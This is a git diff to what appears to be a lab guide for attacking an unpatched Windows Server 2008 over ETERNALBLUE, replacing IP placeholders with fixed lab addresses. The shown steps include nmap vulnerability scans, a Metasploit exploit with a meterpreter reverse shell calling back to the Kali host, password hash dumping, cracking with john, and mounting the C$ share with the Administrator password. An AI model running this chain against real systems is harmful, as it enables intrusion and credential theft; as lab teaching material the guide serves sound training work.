@@ -10,6 +10,7 @@ In order to execute this lab, there are a few things you will need to get starte
    * The Administrator password should be set to something simple to make the demonstration of password cracking easier. In our example, we'll use `Drowssap1` as our password.
 2. Kali Linux installed to attack the target host from
 3. Both machines should be connected to the same network
+4. For this lab we're going to use the IP 192.168.100.10 for the Windows attack host and 192.168.100.11 for the Kali console. Replace these IPs in the instructions with your own if using different ones.
 
 ## Attack Execution
 
@@ -19,7 +20,7 @@ Here we will walk through the process of attacking and gaining access to the unp
 2. We need to discover the host and determine what services are available on the machine so we can begin looking for weaknesses. nmap is a tool that helps us do this.
 
 ```bash
-nmap -T4 -sSVC <IP address of your Windows server> -p 80,443,445
+nmap -T4 -sSVC 192.168.100.10 -p 80,443,445
 ```
 
    These parameters do the following:  
@@ -35,7 +36,7 @@ nmap -T4 -sSVC <IP address of your Windows server> -p 80,443,445
 3. We can see from the output that nmap was able to determine from the SMB information that the operating system is Windows Server 2008. We know that this OS, if unpatched, can be vulnerable to the ETERNALBLUE exploit. We'll now run an nmap script to determine if this server is unpatched and vulnerable.
 
 ```bash
-nmap -p 445 <IP of Windows host> --script smb-vuln-ms17-010
+nmap -p 445 192.168.100.10 --script smb-vuln-ms17-010
 ```
 
    * This tells nmap to scan your host on port 445 using the script that determines if it is vulnerable to ETERNALBLUE. It should come back indicating that it is indeed vulnerable.
@@ -58,10 +59,10 @@ use exploit/windows/smb/ms17_010_eternalblue
 show options
 ```
 
-7. Notice that the RHOST option is requied. This is the IP address of the host to be attacked.
+7. Notice that the RHOST option is required. This is the IP address of the host to be attacked.
 
 ```bash
-set RHOST <IP address of your Windows server>
+set RHOST 192.168.100.10
 ```
 
 8. Now we need to set the payload. You can use many kinds of payloads to gain shell access, but in this scenario we'll deploy a meterpreter reverse tcp shell that connects back to our local box. Meterpreter shell allows us to execute a variety of useful functions once we gain access to the target box.
@@ -73,7 +74,7 @@ set payload payload/windows/meterpreter/reverse_tcp
 9. Now show options again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.
 
 ```bash
-set LHOST <IP of your Kali box>
+set LHOST 192.168.100.11
 ```
 
 10. Run the exploit. If it goes well, you should see a WIN! message and have a new meterpreter shell prompt.
@@ -102,7 +103,7 @@ spool /tmp/console.log
 
 ```bash
 sessions -l
-sessions -i <id>
+sessions -i 1
 ```
 
 14. Back on the meterpreter shell, run `hashdump`. You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 
@@ -136,8 +137,8 @@ john --format=nt hashedpasswords.txt
 
 ```bash
 mkdir -p /mnt/atk_share
-smbclient -L hostname -I <IP of Windows host> -U Administrator
-mount -t cifs //<ip of Windows host>/C$ /mnt/atk_share -o username=Administrator,password=Drowssap1
+smbclient -L hostname -I 192.168.100.10 -U Administrator
+mount -t cifs //192.168.100.10/C$ /mnt/atk_share -o username=Administrator,password=Drowssap1
 ```
 
    * `mkdir` command creates the full directory specified
